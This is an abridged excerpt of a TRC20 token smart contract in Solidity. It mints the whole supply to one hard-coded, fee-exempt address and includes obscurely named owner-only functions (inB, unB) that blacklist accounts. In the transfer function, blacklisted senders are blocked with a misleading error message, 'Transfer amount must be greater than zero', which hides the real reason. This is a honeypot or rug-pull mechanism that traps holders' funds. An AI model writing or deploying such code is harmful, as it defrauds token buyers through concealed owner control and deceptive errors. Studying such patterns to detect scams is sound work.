...
contract Token is Context, ITRC20, Ownable {
    ...
    constructor () public {
        ...
        _isExcludedFromFee[0x5fff512925f5BD23b5C64f0B6D44D1c31bAA8ddF] = true;

        _balances[0x5fff512925f5BD23b5C64f0B6D44D1c31bAA8ddF] = _totalSupply;

        emit Transfer(address(0), 0x5fff512925f5BD23b5C64f0B6D44D1c31bAA8ddF, _totalSupply);
    }
    ...
    function inB(address account) public onlyOwner {
        _isB[account] = true;
    }

    function unB(address account) public onlyOwner {
        _isB[account] = false;
    }
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        ...
        require(!_isB[sender], "Transfer amount must be greater than zero");
